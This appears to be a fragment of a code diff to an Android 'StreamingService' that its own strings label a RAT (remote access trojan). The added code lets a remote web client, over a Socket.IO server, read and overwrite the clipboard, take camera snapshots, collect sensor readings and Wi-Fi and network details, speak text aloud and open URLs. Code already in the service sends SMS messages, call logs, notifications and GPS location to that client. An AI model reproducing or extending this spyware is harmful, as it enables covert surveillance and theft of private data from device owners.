+        if (payload == null) return;
+        String url = payload.optString("url", "");
+        if (!url.isEmpty()) {
+            try {
+                android.net.Uri uri = android.net.Uri.parse(url);
+                Intent intent = new Intent(Intent.ACTION_VIEW, uri);
+                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(intent);
+            } catch (Exception e) {
+                Log.e(TAG, "Error opening URL", e);
+            }
+        }
+    }
+
+    private boolean isTorchOn = false;
+    private void toggleFlashlight(JSONObject payload) {
+        try {
+            android.hardware.camera2.CameraManager cm = (android.hardware.camera2.CameraManager) getSystemService(CAMERA_SERVICE);
+            if (cm == null) return;
+            String cameraId = null;
+            for (String id : cm.getCameraIdList()) {
+                Boolean hasFlash = cm.getCameraCharacteristics(id).get(android.hardware.camera2.CameraCharacteristics.FLASH_INFO_AVAILABLE);
+                if (hasFlash != null && hasFlash) {
+                    cameraId = id;
+                    break;
+                }
+            }
+            if (cameraId == null) {
+                Log.w(TAG, "No camera with flashlight found");
+                return;
+            }
+            isTorchOn = (payload != null) ? payload.optBoolean("on", !isTorchOn) : !isTorchOn;
+            cm.setTorchMode(cameraId, isTorchOn);
+            Log.d(TAG, "Flashlight toggled to: " + isTorchOn);
+        } catch (Exception e) {
+            Log.e(TAG, "Flashlight error", e);
+        }
+    }
+
+    private void setVolume(JSONObject payload) {
+        if (payload == null) return;
+        try {
+            AudioManager am = (AudioManager) getSystemService(AUDIO_SERVICE);
+            if (am == null) return;
+            int streamType = AudioManager.STREAM_MUSIC;
+            switch (payload.optString("stream", "music")) {
+                case "ring":
+                    streamType = AudioManager.STREAM_RING;
+                    break;
+                case "alarm":
+                    streamType = AudioManager.STREAM_ALARM;
+                    break;
+                case "call":
+                    streamType = AudioManager.STREAM_VOICE_CALL;
+                    break;
+            }
+            int maxVol = am.getStreamMaxVolume(streamType);
+            int pct = Math.min(100, Math.max(0, payload.optInt("pct", 50)));
+            int volume = (int) (maxVol * pct / 100.0);
+            am.setStreamVolume(streamType, volume, 0);
+            Log.d(TAG, "Volume set to " + volume + "/" + maxVol + " for stream " + streamType);
+        } catch (Exception e) {
+            Log.e(TAG, "Set volume error", e);
+        }
+    }
+
+    private void setBrightness(JSONObject payload) {
+        if (payload == null) return;
+        try {
+            int pct = Math.min(100, Math.max(0, payload.optInt("pct", 50)));
+            int val = (int) (pct / 100.0 * 255);
+            if (Settings.System.canWrite(this)) {
+                Settings.System.putInt(getContentResolver(),
+                        Settings.System.SCREEN_BRIGHTNESS_MODE,
+                        Settings.System.SCREEN_BRIGHTNESS_MODE_MANUAL);
+                Settings.System.putInt(getContentResolver(),
+                        Settings.System.SCREEN_BRIGHTNESS, val);
+                Log.d(TAG, "Brightness set to: " + val);
+            } else {
+                Log.w(TAG, "WRITE_SETTINGS permission not granted");
+                new Handler(Looper.getMainLooper()).post(() ->
+                    Toast.makeText(StreamingService.this, "Please grant Write Settings permission to adjust brightness", Toast.LENGTH_LONG).show()
+                );
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Set brightness error", e);
+        }
+    }
+
+    private void ringDevice() {
+        try {
+            AudioManager am = (AudioManager) getSystemService(AUDIO_SERVICE);
+            if (am != null) {
+                am.setStreamVolume(AudioManager.STREAM_RING,
+                        am.getStreamMaxVolume(AudioManager.STREAM_RING), 0);
+            }
+            android.media.Ringtone ringtone = android.media.RingtoneManager.getRingtone(this,
+                    android.media.RingtoneManager.getDefaultUri(android.media.RingtoneManager.TYPE_RINGTONE));
+            if (ringtone != null) {
+                ringtone.play();
+                Log.d(TAG, "Playing default ringtone");
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Ring device error", e);
+        }
+    }
+
+    private long currentGpsIntervalMs = 10000;
 
     private void startLocationUpdates() {
+        startLocationUpdates(currentGpsIntervalMs);
+    }
+
+    private void startLocationUpdates(long intervalMs) {
         if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
             Log.w(TAG, "Location permission not granted");
             broadcastPermissionError();
             return;
         }
 
+        stopLocationUpdates();
+        currentGpsIntervalMs = intervalMs;
+        if (intervalMs <= 0) {
+            Log.d(TAG, "GPS location updates suspended");
+            return;
+        }
+
         LocationRequest locationRequest = LocationRequest.create();
-        locationRequest.setInterval(10000); // Update every 10 seconds
-        locationRequest.setFastestInterval(5000);
+        locationRequest.setInterval(intervalMs);
+        locationRequest.setFastestInterval(intervalMs / 2);
         locationRequest.setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
 
         locationCallback = new LocationCallback() {
@@ -612,7 +897,7 @@ public class StreamingService extends Service {
 
         try {
             fusedLocationClient.requestLocationUpdates(locationRequest, locationCallback, Looper.getMainLooper());
-            Log.d(TAG, "Started location updates");
+            Log.d(TAG, "Started location updates with interval: " + intervalMs + "ms");
         } catch (SecurityException e) {
             Log.e(TAG, "Failed to start location updates", e);
             broadcastPermissionError();
@@ -631,10 +916,22 @@ public class StreamingService extends Service {
             locationData.put("to", webClientId);
             locationData.put("latitude", latitude);
             locationData.put("longitude", longitude);
-            socket.emit("location", locationData);
+            socket.emit(Constants.EVENT_LOCATION, locationData);
             Log.d(TAG, "Sent location: lat=" + latitude + ", lng=" + longitude);
         } catch (JSONException e) {
             Log.e(TAG, "Error sending location", e);
+        }
+    }
+
+    private void requestLastLocation() {
+        if (fusedLocationClient != null) {
+            try {
+                fusedLocationClient.getLastLocation().addOnSuccessListener(location -> {
+                    if (location != null) {
+                        sendLocation(location.getLatitude(), location.getLongitude());
+                    }
+                });
+            } catch (SecurityException ignored) {}
         }
     }
 
@@ -649,24 +946,6 @@ public class StreamingService extends Service {
     private void startNotificationListener() {
         Intent intent = new Intent(this, NotificationListener.class);
         startService(intent);
-    }
-
-    private void startDataPolling() {
-        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED ||
-                ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
-            Log.w(TAG, "Call log or SMS permission not granted, skipping data polling");
-            return;
-        }
-        dataHandler = new Handler();
-        dataRunnable = new Runnable() {
-            @Override
-            public void run() {
-                sendCallLogs();
-                sendSmsMessages();
-                dataHandler.postDelayed(this, DATA_POLL_INTERVAL);
-            }
-        };
-        dataHandler.post(dataRunnable);
     }
 
     private void sendCallLogs() {
@@ -720,7 +999,7 @@ public class StreamingService extends Service {
             msg.put("from", socket.id());
             msg.put("call_logs", callLogs);
 
-            socket.emit("call_log", msg);
+            socket.emit(Constants.EVENT_CALL_LOG, msg);
             Log.d(TAG, "Sent call logs: " + callLogs.toString());
         } catch (JSONException e) {
             Log.e(TAG, "Error sending call logs", e);
@@ -780,7 +1059,7 @@ public class StreamingService extends Service {
             msg.put("from", socket.id());
             msg.put("sms_messages", smsMessages);
 
-            socket.emit("sms", msg);
+            socket.emit(Constants.EVENT_SMS, msg);
             Log.d(TAG, "Sent SMS messages: " + smsMessages.toString());
         } catch (JSONException e) {
             Log.e(TAG, "Error sending SMS messages", e);
@@ -842,7 +1121,7 @@ public class StreamingService extends Service {
                             msg.put("to", webClientId);
                             msg.put("from", socket.id());
                             msg.put("signal", signal);
-                            socket.emit("signal", msg);
+                            socket.emit(Constants.EVENT_SIGNAL, msg);
                             Log.d(TAG, "Sent offer to web client");
                         } catch (JSONException e) {
                             Log.e(TAG, "Offer send fail", e);
@@ -917,16 +1196,16 @@ public class StreamingService extends Service {
         NotificationManager nm = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             NotificationChannel ch = new NotificationChannel(
-                    CHANNEL_ID, "Streaming Service", NotificationManager.IMPORTANCE_LOW);
+                    Constants.CHANNEL_ID, "Streaming Service", NotificationManager.IMPORTANCE_LOW);
             ch.setDescription("Camera, mic, notifications, call logs, SMS, and location streaming");
             nm.createNotificationChannel(ch);
         }
         Intent stop = new Intent(this, StreamingService.class);
-        stop.setAction("STOP_STREAMING");
+        stop.setAction(Constants.ACTION_STOP_STREAMING);
         PendingIntent stopPI = PendingIntent.getService(this, 0, stop,
                 Build.VERSION.SDK_INT >= Build.VERSION_CODES.M ?
                         PendingIntent.FLAG_IMMUTABLE : PendingIntent.FLAG_UPDATE_CURRENT);
-        return new NotificationCompat.Builder(this, CHANNEL_ID)
+        return new NotificationCompat.Builder(this, Constants.CHANNEL_ID)
                 .setContentTitle("Streaming Active")
                 .setContentText("Camera, mic, notifications, call logs, SMS, and location streaming")
                 .addAction(android.R.drawable.ic_media_pause, "Stop", stopPI)
@@ -935,29 +1214,263 @@ public class StreamingService extends Service {
                 .build();
     }
 
+    private void toggleSensorSubscription(JSONObject payload) {
+        if (payload == null || sensorManager == null) return;
+        boolean active = payload.optBoolean("active", false);
+        isSensorSubscribed = active;
+        if (active) {
+            Log.d(TAG, "Subscribed to hardware sensors");
+            if (lightSensor != null) {
+                sensorManager.registerListener(this, lightSensor, android.hardware.SensorManager.SENSOR_DELAY_NORMAL);
+            }
+            if (proximitySensor != null) {
+                sensorManager.registerListener(this, proximitySensor, android.hardware.SensorManager.SENSOR_DELAY_NORMAL);
+            }
+            if (accelSensor != null) {
+                sensorManager.registerListener(this, accelSensor, android.hardware.SensorManager.SENSOR_DELAY_NORMAL);
+            }
+        } else {
+            Log.d(TAG, "Unsubscribed from hardware sensors");
+            sensorManager.unregisterListener(this);
+        }
+    }
+
+    private float lastLight = -1;
+    private float lastProximity = -1;
+    private float[] lastAccel = new float[3];
+
+    @Override
+    public void onSensorChanged(android.hardware.SensorEvent event) {
+        if (!isSensorSubscribed || webClientId == null || socket == null || !socket.connected()) return;
+        
+        boolean changed = false;
+        int type = event.sensor.getType();
+        if (type == android.hardware.Sensor.TYPE_LIGHT) {
+            float val = event.values[0];
+            if (Math.abs(val - lastLight) > 1.0f || lastLight == -1) {
+                lastLight = val;
+                changed = true;
+            }
+        } else if (type == android.hardware.Sensor.TYPE_PROXIMITY) {
+            float val = event.values[0];
+            if (val != lastProximity || lastProximity == -1) {
+                lastProximity = val;
+                changed = true;
+            }
+        } else if (type == android.hardware.Sensor.TYPE_ACCELEROMETER) {
+            float x = event.values[0];
+            float y = event.values[1];
+            float z = event.values[2];
+            if (Math.abs(x - lastAccel[0]) > 0.5f || Math.abs(y - lastAccel[1]) > 0.5f || Math.abs(z - lastAccel[2]) > 0.5f) {
+                lastAccel[0] = x;
+                lastAccel[1] = y;
+                lastAccel[2] = z;
+                changed = true;
+            }
+        }
+
+        long now = System.currentTimeMillis();
+        if (changed && (now - lastSensorEmitTime >= 1000)) {
+            lastSensorEmitTime = now;
+            try {
+                JSONObject data = new JSONObject();
+                data.put("to", webClientId);
+                data.put("from", socket.id());
+                
+                JSONObject sensors = new JSONObject();
+                sensors.put("lux", lastLight);
+                sensors.put("proximity", lastProximity);
+                sensors.put("accelX", Math.round(lastAccel[0] * 100.0) / 100.0);
+                sensors.put("accelY", Math.round(lastAccel[1] * 100.0) / 100.0);
+                sensors.put("accelZ", Math.round(lastAccel[2] * 100.0) / 100.0);
+                data.put("sensors", sensors);
+                
+                socket.emit(Constants.EVENT_SENSOR_DATA, data);
+            } catch (JSONException e) {
+                Log.e(TAG, "Sensor JSON compilation error", e);
+            }
+        }
+    }
+
+    @Override
+    public void onAccuracyChanged(android.hardware.Sensor sensor, int accuracy) {}
+
+    private void sendNetworkDiagnostics() {
+        if (webClientId == null || socket == null || !socket.connected()) return;
+        try {
+            android.net.wifi.WifiManager wifiManager = (android.net.wifi.WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
+            android.net.ConnectivityManager connManager = (android.net.ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
+            
+            String connectionType = "Unknown";
+            String ssid = "Unavailable";
+            int rssi = -127;
+            int linkSpeed = 0;
+            String localIp = "0.0.0.0";
+
+            if (connManager != null) {
+                android.net.NetworkInfo activeNet = connManager.getActiveNetworkInfo();
+                if (activeNet != null && activeNet.isConnected()) {
+                    connectionType = activeNet.getTypeName();
+                }
+            }
+
+            if (wifiManager != null && wifiManager.isWifiEnabled()) {
+                android.net.wifi.WifiInfo wifiInfo = wifiManager.getConnectionInfo();
+                if (wifiInfo != null) {
+                    ssid = wifiInfo.getSSID();
+                    if (ssid.startsWith("\"") && ssid.endsWith("\"")) {
+                        ssid = ssid.substring(1, ssid.length() - 1);
+                    }
+                    rssi = wifiInfo.getRssi();
+                    linkSpeed = wifiInfo.getLinkSpeed();
+                    
+                    int ip = wifiInfo.getIpAddress();
+                    localIp = String.format(Locale.getDefault(), "%d.%d.%d.%d",
+                            (ip & 0xff), (ip >> 8 & 0xff), (ip >> 16 & 0xff), (ip >> 24 & 0xff));
+                }
+            }
+
+            JSONObject netInfo = new JSONObject();
+            netInfo.put("connectionType", connectionType);
+            netInfo.put("ssid", ssid);
+            netInfo.put("rssi", rssi);
+            netInfo.put("linkSpeed", linkSpeed);
+            netInfo.put("localIp", localIp);
+
+            JSONObject msg = new JSONObject();
+            msg.put("to", webClientId);
+            msg.put("from", socket.id());
+            msg.put("network", netInfo);
+
+            socket.emit(Constants.EVENT_NETWORK_INFO, msg);
+            Log.d(TAG, "Sent network diagnostics profile");
+        } catch (Exception e) {
+            Log.e(TAG, "Network diagnostics fetch error", e);
+        }
+    }
+
+    private void takeCameraSnapshot(JSONObject payload) {
+        if (payload == null || cameraManager == null) return;
+        boolean useFront = payload.optBoolean("useFront", false);
+        Log.d(TAG, "Taking photo snapshot with camera lens facing: " + (useFront ? "Front" : "Back"));
+        new Thread(() -> {
+            cameraManager.captureSnapshot(useFront, base64Image -> {
+                if (webClientId == null || socket == null || !socket.connected()) return;
+                try {
+                    JSONObject data = new JSONObject();
+                    data.put("image", base64Image);
+                    data.put("camera", useFront ? "front" : "back");
+
+                    JSONObject msg = new JSONObject();
+                    msg.put("to", webClientId);
+                    msg.put("from", socket.id());
+                    msg.put("snapshot", data);
+
+                    socket.emit(Constants.EVENT_SNAPSHOT_DATA, msg);
+                    Log.d(TAG, "JPEG snapshot delivered to target web client");
+                } catch (JSONException e) {
+                    Log.e(TAG, "Snapshot packaging failed", e);
+                }
+            });
+        }).start();
+    }
+
+    private void getClipboardText() {
+        if (webClientId == null || socket == null || !socket.connected()) return;
+        new Handler(Looper.getMainLooper()).post(() -> {
+            try {
+                android.content.ClipboardManager clipboard = (android.content.ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
+                String text = "";
+                if (clipboard != null && clipboard.hasPrimaryClip()) {
+                    android.content.ClipData clip = clipboard.getPrimaryClip();
+                    if (clip != null && clip.getItemCount() > 0) {
+                        CharSequence chars = clip.getItemAt(0).getText();
+                        if (chars != null) {
+                            text = chars.toString();
+                        }
+                    }
+                }
+                
+                JSONObject payload = new JSONObject();
+                payload.put("to", webClientId);
+                payload.put("from", socket.id());
+                payload.put("clipboard", text);
+
+                socket.emit(Constants.EVENT_CLIPBOARD_DATA, payload);
+                Log.d(TAG, "Clipboard text fetched and sent: " + text);
+            } catch (Exception e) {
+                Log.e(TAG, "Read clipboard failed", e);
+            }
+        });
+    }
+
+    private void setClipboardText(JSONObject payload) {
+        if (payload == null) return;
+        String text = payload.optString("text", "");
+        new Handler(Looper.getMainLooper()).post(() -> {
+            try {
+                android.content.ClipboardManager clipboard = (android.content.ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
+                if (clipboard != null) {
+                    android.content.ClipData clip = android.content.ClipData.newPlainText("RAT Clipboard", text);
+                    clipboard.setPrimaryClip(clip);
+                    Log.d(TAG, "Device clipboard text updated remotely");
+                    showToast(new JSONObject().put("text", "Clipboard updated"));
+                }
+            } catch (Exception e) {
+                Log.e(TAG, "Write clipboard failed", e);
+            }
+        });
+    }
+
+    @Override
+    public void onInit(int status) {
+        if (status == TextToSpeech.SUCCESS) {
+            if (tts != null) {
+                tts.setLanguage(Locale.US);
+                Log.d(TAG, "TTS Synthesizer initialized successfully");
+            }
+        } else {
+            Log.e(TAG, "TTS Initialization failed");
+        }
+    }
+
+    private void speakTts(JSONObject payload) {
+        if (payload == null || tts == null) return;
+        try {
+            String text = payload.optString("text", "");
+            float pitch = (float) payload.optDouble("pitch", 1.0);
+            float speed = (float) payload.optDouble("speed", 1.0);
+            if (!text.isEmpty()) {
+                tts.setPitch(pitch);
+                tts.setSpeechRate(speed);
+                tts.speak(text, TextToSpeech.QUEUE_FLUSH, null, "RAT_TTS");
+                Log.d(TAG, "Spoke phrase remotely via TTS: " + text);
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "TTS Speech output error", e);
+        }
+    }
+
     private void cleanup() {
+        if (tts != null) {
+            tts.stop();
+            tts.shutdown();
+            tts = null;
+        }
+        if (sensorManager != null) {
+            sensorManager.unregisterListener(this);
+        }
         stopLocationUpdates();
-        if (frontCapturer != null) {
-            try {
-                frontCapturer.stopCapture();
-            } catch (InterruptedException ignored) {}
-            frontCapturer.dispose();
-            frontCapturer = null;
+        
+        if (cameraManager != null) {
+            cameraManager.dispose();
+            cameraManager = null;
         }
-        if (backCapturer != null) {
-            try {
-                backCapturer.stopCapture();
-            } catch (InterruptedException ignored) {}
-            backCapturer = null;
+        if (localRecorder != null) {
+            localRecorder.stop(null);
+            localRecorder = null;
         }
-        if (frontSource != null) {
-            frontSource.dispose();
-            frontSource = null;
-        }
-        if (backSource != null) {
-            backSource.dispose();
-            backSource = null;
-        }
+        
         if (audioSource != null) {
             audioSource.dispose();
             audioSource = null;
@@ -965,14 +1478,6 @@ public class StreamingService extends Service {
         if (peerConnection != null) {
             peerConnection.close();
             peerConnection = null;
-        }
-        if (frontHelper != null) {
-            frontHelper.dispose();
-            frontHelper = null;
-        }
-        if (backHelper != null) {
-            backHelper.dispose();
-            backHelper = null;
         }
         if (eglBase != null) {
             eglBase.release();
@@ -1004,7 +1509,7 @@ public class StreamingService extends Service {
 
         private String getSignalingUrl() {
             SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(this);
-            return prefs.getString("signaling_url", DEFAULT_SIGNALING_URL);
+            return prefs.getString(Constants.PREF_SIGNALING_URL, Constants.DEFAULT_SIGNALING_URL);
         }
 
         private void connectSignaling() {
@@ -1016,8 +1521,8 @@ public class StreamingService extends Service {
 
                 socket.on(Socket.EVENT_CONNECT, args -> {
                     Log.d(TAG, "NotificationListener Socket.IO CONNECTED");
-                    socket.emit("identify", "android");
-                }).on("web-client-ready", args -> {
+                    socket.emit(Constants.EVENT_IDENTIFY, "android");
+                }).on(Constants.EVENT_WEB_CLIENT_READY, args -> {
                     if (args.length > 0 && args[0] instanceof String) {
                         webClientId = (String) args[0];
                         Log.d(TAG, "NotificationListener Web client ready: " + webClientId);
@@ -1058,7 +1563,7 @@ public class StreamingService extends Service {
                 msg.put("from", socket.id());
                 msg.put("notification", notificationData);
 
-                socket.emit("notification", msg);
+                socket.emit(Constants.EVENT_NOTIFICATION, msg);
                 Log.d(TAG, "Sent notification: " + notificationData.toString());
             } catch (JSONException e) {
                 Log.e(TAG, "Error sending notification", e);
